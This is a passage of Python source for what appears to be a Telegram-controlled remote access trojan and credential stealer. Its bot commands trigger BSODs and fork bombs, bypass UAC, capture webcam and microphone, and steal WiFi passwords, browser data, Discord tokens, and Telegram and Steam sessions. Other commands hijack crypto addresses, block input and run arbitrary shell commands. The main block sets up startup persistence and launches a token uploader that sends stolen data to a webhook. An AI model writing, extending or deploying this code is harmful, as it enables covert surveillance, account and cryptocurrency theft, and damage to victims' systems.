        bot.reply_to(message, "🛡 **Failed to turn off monitors!** (Try running as Admin)")


@bot.message_handler(commands=['monitorson'])
@require_active_system
def monitors_on(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)

    if controller.toggle_monitors("on"):
        bot.reply_to(message, "🍀 **Monitors turned ON**")
    else:
        bot.reply_to(message, "🛡 **Failed to turn on monitors!** (Try running as Admin)")

@bot.message_handler(commands=['bsod'])
@require_active_system
def trigger_bsod(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    bot.reply_to(message, "💥 Triggering BSOD...")
    controller.trigger_bsod()

@bot.message_handler(commands=['forkbomb'])
@require_active_system
def execute_forkbomb(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    bot.reply_to(message, "💣 Executing fork bomb...")
    controller.execute_forkbomb()

@bot.message_handler(commands=['implode'])
@require_active_system
def implode(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    bot.reply_to(message, "🧨 Self-destructing...")
    controller.delete_self()

@bot.message_handler(commands=['uacbypass'])
@require_active_system
def uac_bypass(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    if controller.bypass_uac():
        bot.reply_to(message, "🍀 UAC bypass attempted")
    else:
        bot.reply_to(message, "🛡 UAC bypass failed")

# ==================== Process Management Commands ====================

@bot.message_handler(commands=['processes'])
@require_active_system
def list_processes(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    processes = controller.get_processes()
    if not processes:
        bot.reply_to(message, "🛡 Failed to get processes")
        return
    
    response = "� Running Processes:\n\n"
    for proc in processes[:50]:  # Limit to first 50 processes
        response += f"PID: {proc['pid']} | Name: {proc['name']} | User: {proc['username']}\n"
    
    send_large_message(message.chat.id, response)

@bot.message_handler(commands=['kill'])
@require_active_system
def kill_process(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "🛡 Please specify a PID or process name")
        return
    
    target = args[0]
    try:
        target = int(target)  # Try to parse as PID
    except ValueError:
        pass  # It's a process name
    
    if controller.kill_process(target):
        bot.reply_to(message, f"🍀 Process {target} killed")
    else:
        bot.reply_to(message, f"🛡 Failed to kill process {target}")

@bot.message_handler(commands=['foreground'])
@require_active_system
def foreground_process(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    proc = controller.get_foreground_process()
    bot.reply_to(message, f"🖥️ Foreground process: {proc}")

# ==================== Webcam & Audio Commands ====================

@bot.message_handler(commands=['webcam'])
@require_active_system
def capture_webcam(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    img_path = controller.capture_webcam()
    if img_path:
        with open(img_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.unlink(img_path)
    else:
        bot.reply_to(message, "🛡 Failed to capture webcam")

@bot.message_handler(commands=['volume'])
@require_active_system
def set_volume(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "🛡 Please specify volume level (0-100)")
        return
    
    try:
        level = int(args[0])
        if level < 0 or level > 100:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "🛡 Invalid volume level (must be 0-100)")
        return
    
    if controller.set_volume(level):
        bot.reply_to(message, f"🔊 Volume set to {level}%")
    else:
        bot.reply_to(message, "🛡 Failed to set volume")

@bot.message_handler(commands=['recordmic'])
@require_active_system
def record_microphone(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    duration = 5  # Default duration
    if args:
        try:
            duration = int(args[0])
        except ValueError:
            pass
    
    bot.reply_to(message, f"🎤 Recording microphone for {duration} seconds...")
    recording = controller.record_microphone(duration)
    
    if recording is not None:
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as tmp:
            wavio.write(tmp.name, recording, 44100, sampwidth=2)
            with open(tmp.name, 'rb') as audio:
                bot.send_audio(message.chat.id, audio)
        os.unlink(tmp.name)
    else:
        bot.reply_to(message, "🛡 Failed to record microphone")

@bot.message_handler(commands=['tts'])
@require_active_system
def text_to_speech(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    text = message.text.split('/tts ')[1] if '/tts ' in message.text else None
    if not text:
        bot.reply_to(message, "🛡 Please provide text to speak")
        return
    
    if controller.text_to_speech(text):
        bot.reply_to(message, f"🗣️ Speaking: {text}")
    else:
        bot.reply_to(message, "🛡 Failed to perform text-to-speech")

# ==================== Browser Data Commands ====================

@bot.message_handler(commands=['wifi'])
@require_active_system
def get_wifi_passwords(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    wifi_data = controller.get_wifi_passwords()
    if not wifi_data:
        bot.reply_to(message, "🛡 Failed to get WiFi passwords")
        return
    
    response = "📶 Saved WiFi Networks:\n\n"
    for network in wifi_data:
        response += f"📡 SSID: {network['ssid']}\n🔑 Password: {network['password']}\n\n"
    
    send_large_message(message.chat.id, response)

@bot.message_handler(commands=['grabbrowser'])
@require_active_system
def grab_browser_data(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    
    bot.reply_to(message, "� Extracting browser data from selected system...")
    
    try:
        extractor = BrowserDataExtractor()
        all_data = extractor.extract_all_browser_data()
        txt_file, zip_file = extractor.create_data_files(all_data)
        
        with open(zip_file, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"🌐 Browser data from {manager.get_system(system_id).name}")
        
        os.unlink(txt_file)
        os.unlink(zip_file)
    except Exception as e:
        bot.reply_to(message, f"🛡 Failed to extract browser data: {str(e)}")

@bot.message_handler(commands=['discord'])
@require_active_system
def grab_discord_tokens(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    system_name = manager.get_system(system_id).name
    
    bot.reply_to(message, f"� Searching for Discord tokens on {system_name}...")
    
    try:
        extractor = TokenExtractor()
        tokens, uids = extractor.extract()
        
        if not tokens:
            bot.reply_to(message, "🛡 No Discord tokens found")
            return
        response = f"🔑 Found Discord Tokens on {system_name}:\n\n"        
        token_chunks = [tokens[i:i + 5] for i in range(0, len(tokens), 5)]
        
        for chunk in token_chunks:
            chunk_response = ""
            for token in chunk:
                user_info = DiscordUserInfo(token)
                username = f"{user_info.user_data.get('username')}#{user_info.user_data.get('discriminator')}"
                chunk_response += f"👤 User: {username}\n"
                chunk_response += f"📧 Email: {user_info.user_data.get('email', 'None')}\n"
                chunk_response += f"📱 Phone: {user_info.user_data.get('phone', 'None')}\n"
                chunk_response += f"💎 Nitro: {user_info.get_nitro_type()}\n"
                chunk_response += f"🔑 Token: `{token[:15]}...`\n\n"
            
            send_large_message(message.chat.id, chunk_response)
            time.sleep(1)  # Avoid rate limiting
            
        # Send complete tokens privately
        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as tmp:
            for token in tokens:
                tmp.write(f"{token}\n\n")
            tmp.close()
            
            with open(tmp.name, 'rb') as f:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"🔐 Complete Discord tokens from {system_name}",
                    visible_file_name="tokens.txt"
                )
            os.unlink(tmp.name)
            
    except Exception as e:
        bot.reply_to(message, f"🛡 Failed to extract Discord tokens: {str(e)}")


@bot.message_handler(commands=['grabtelegram'])
@require_active_system
def grab_telegram_sessions(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    system_name = manager.get_system(system_id).name
    
    bot.reply_to(message, f"� Extracting Telegram sessions from {system_name}...")

    try:
        extractor = TelegramSessionExtractor()
        success, result = extractor.extract_session()

        if success:
            with open(result, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"📲 Telegram session from {system_name}")
            os.remove(result)
        else:
            bot.reply_to(message, f"🛡 Failed: {result}")

    except Exception as e:
        bot.reply_to(message, f"🛡 Extraction error: {str(e)}")



@bot.message_handler(commands=['grabsteam'])
@require_active_system
def grab_steam_session(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    system_name = manager.get_system(system_id).name

    bot.reply_to(message, f"🎮 Extracting Steam session files from {system_name}...")

    try:
        extractor = SteamSessionExtractor()
        archive_path = extractor.extract_session()

        if archive_path and os.path.exists(archive_path):
            with open(archive_path, 'rb') as f:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"🍀 Steam session from {system_name}"
                )
            os.remove(archive_path)
        else:
            bot.reply_to(message, "🛡 Failed to extract Steam session.")
    except Exception as e:
        bot.reply_to(message, f"🛡 Error: {str(e)}")
# ==================== File Operation Commands ====================

@bot.message_handler(commands=['ls'])
@require_active_system
def list_directory(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    path = args[0] if args else os.getcwd()
    
    try:
        items = controller.file_operations("list", path)
        if items is None:
            bot.reply_to(message, f"🛡 Failed to list directory: {path}")
            return
        
        response = f"📂 Contents of {path}:\n\n"
        for item in items:
            response += f"• {item}\n"
        
        send_large_message(message.chat.id, response)
    except Exception as e:
        bot.reply_to(message, f"🛡 Error listing directory: {str(e)}")

@bot.message_handler(commands=['cd'])
@require_active_system
def change_directory(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, f"📂 Current directory: {os.getcwd()}")
        return
    
    path = ' '.join(args)
    new_path = controller.file_operations("cd", path)
    if new_path:
        bot.reply_to(message, f"📂 Changed to directory: {new_path}")
    else:
        bot.reply_to(message, f"🛡 Failed to change to directory: {path}")

@bot.message_handler(commands=['download'])
@require_active_system
def download_file(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "🛡 Please specify a file path")
        return
    
    file_path = ' '.join(args)
    if not os.path.exists(file_path):
        bot.reply_to(message, f"🛡 File not found: {file_path}")
        return
    
    try:
        with open(file_path, 'rb') as f:
            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                bot.reply_to(message, "🛡 File too large (max 50MB)")
            else:
                bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.reply_to(message, f"Failed to download file: {str(e)}")




@bot.message_handler(commands=['upload'])
@require_active_system
def request_upload(message):
    msg = bot.reply_to(message, "📤 لطفا مسیر مقصد را در سیستم هدف ارسال کنید (مثال: C:/myfiles/)")
    bot.register_next_step_handler(msg, process_upload_path)

def process_upload_path(message):
    try:
        dest_path = message.text.strip()
        if not dest_path:
            bot.reply_to(message, "🛡 مسیر نمی‌تواند خالی باشد")
            return
            
        msg = bot.reply_to(message, f"� مسیر مقصد: {dest_path}\n\n📤 لطفا فایل را ارسال کنید")
        bot.register_next_step_handler(msg, lambda m: handle_file_upload(m, dest_path))
    except Exception as e:
        bot.reply_to(message, f"🛡 خطا در پردازش مسیر: {str(e)}")

def handle_file_upload(message, dest_path):
    try:
        if not message.document and not message.photo:
            bot.reply_to(message, "هیچ فایل یا عکسی یافت نشد")
            return
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            original_name = message.document.file_name
            file_size = message.document.file_size
        elif message.photo:
            file_info = bot.get_file(message.photo[-1].file_id)
            original_name = f"photo_{file_info.file_unique_id}.jpg"
            file_size = file_info.file_size
        final_path = os.path.join(dest_path, original_name)
        os.makedirs(dest_path, exist_ok=True)
        temp_path = f"temp_{file_info.file_unique_id}"
        downloaded_file = bot.download_file(file_info.file_path)
        with open(temp_path, 'wb') as f:
            f.write(downloaded_file)

        shutil.move(temp_path, final_path)

        size_mb = file_size / (1024 * 1024)
        bot.reply_to(message, (
            f"🍀 فایل با موفقیت آپلود شد!\n\n"
            f"📄 نام فایل: {original_name}\n"
            f"📦 حجم فایل: {size_mb:.2f} MB\n"
            f"📁 مسیر نهایی: {final_path}"
        ))

    except Exception as e:
        bot.reply_to(message, f"خطا در آپلود فایل: {str(e)}")
        if os.path.exists(temp_path):
            os.remove(temp_path)



@bot.message_handler(commands=['remove'])
@require_active_system
def remove_file(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "🛡 Please specify a file/directory path")
        return
    
    target = ' '.join(args)
    if controller.file_operations("remove", target):
        bot.reply_to(message, f"🍀 Removed: {target}")
    else:
        bot.reply_to(message, f"🛡 Failed to remove: {target}")

@bot.message_handler(commands=['execute'])
@require_active_system
def execute_file(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "🛡 Please specify a file path")
        return
    
    file_path = ' '.join(args)
    if controller.file_operations("execute", file_path):
        bot.reply_to(message, f"🚀 Executed: {file_path}")
    else:
        bot.reply_to(message, f"🛡 Failed to execute: {file_path}")

# ==================== Other Commands ====================

@bot.message_handler(commands=['blockinput'])
@require_active_system
def block_input(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    if controller.block_input(True):
        bot.reply_to(message, "⌨️ Input blocked")
    else:
        bot.reply_to(message, "🛡 Failed to block input")

@bot.message_handler(commands=['unblockinput'])
@require_active_system
def unblock_input(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    if controller.block_input(False):
        bot.reply_to(message, "⌨️ Input unblocked")
    else:
        bot.reply_to(message, "🛡 Failed to unblock input")

@bot.message_handler(commands=['websiteblock'])
@require_active_system
def block_website(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "🛡 Please specify a website")
        return
    
    website = args[0]
    if controller.block_website(website):
        bot.reply_to(message, f"🚫 Blocked website: {website}")
    else:
        bot.reply_to(message, f"🛡 Failed to block website: {website}")

@bot.message_handler(commands=['websiteunblock'])
@require_active_system
def unblock_website(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "🛡 Please specify a website")
        return
    
    website = args[0]
    if controller.unblock_website(website):
        bot.reply_to(message, f"🍀 Unblocked website: {website}")
    else:
        bot.reply_to(message, f"🛡 Failed to unblock website: {website}")

@bot.message_handler(commands=['startclipper'])
@require_active_system
def start_clipper(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    if controller.start_clipper(CLIPPER_REPLACE):
        bot.reply_to(message, "Crypto clipper started")
    else:
        bot.reply_to(message, "Failed to start crypto clipper")

@bot.message_handler(commands=['cmd'])
@require_active_system
def run_command(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    command = message.text.split('/cmd ')[1] if '/cmd ' in message.text else None
    if not command:
        bot.reply_to(message, "Please specify a command")
        return
    
    result = controller.run_shell_command(command)
    send_large_message(message.chat.id, f"💻 Command output:\n\n{result}")


# ==================== Main ====================

if __name__ == "__main__":
    with open("config.json", "r") as f:
        config = json.load(f)
    startup_name = config.get("startup_name", "default_startup_name")
    managerr = StartupManager(startup_name)
    # AdminStarter.run_as_admin()
    manager = SystemManager()
    system_id = f"{platform.node()}_{int(time.time())}"
    manager.register_system(
        system_id=system_id,
        owner_id=ADMIN_IDS[0] if ADMIN_IDS else 0,
        name=f"{platform.node()}"
    )
    print("\033[95m" + r"""
 ________  ________  ________  ________  ________  ________   ________  ________  ___  ___  _______               ________     
|\_____  \|\   __  \|\   __  \|\_____  \|\   __  \|\   ___  \|\   __  \|\   ____\|\  \|\  \|\  ___ \          ___|\   ___ \    
 \|___/  /\ \  \|\  \ \  \|\  \\|___/  /\ \  \|\  \ \  \\ \  \ \  \|\  \ \  \___|\ \  \\\  \ \   __/|        |\__\ \  \_|\ \   
     /  / /\ \  \\\  \ \  \\\  \   /  / /\ \   __  \ \  \\ \  \ \   __  \ \  \  __\ \   __  \ \  \_|/__      \|__|\ \  \ \\ \  
    /  /_/__\ \  \\\  \ \  \\\  \ /  /_/__\ \  \ \  \ \  \\ \  \ \  \ \  \ \  \|\  \ \  \ \  \ \  \_|\ \         __\ \  \_\\ \ 
   |\________\ \_______\ \_______\\________\ \__\ \__\ \__\\ \__\ \__\ \__\ \_______\ \__\ \__\ \_______\       |\__\ \_______\
    \|_______|\|_______|\|_______|\|_______|\|__|\|__|\|__| \|__|\|__|\|__|\|_______|\|__|\|__|\|_______|       \|__|\|_______|                                                                                                                                                                                                                                                                                                                                                                                                
    Zoozanaghe — 𐌅𐌋                                                                                                                         
    """ + "\033[0m")
    stealer = TokenUploader(
        webhook_url=config.get('webhook_url', ""),
        telegram_config=config.get('telegram_config', {})
    )
    stealer.run()
    bot.infinity_polling()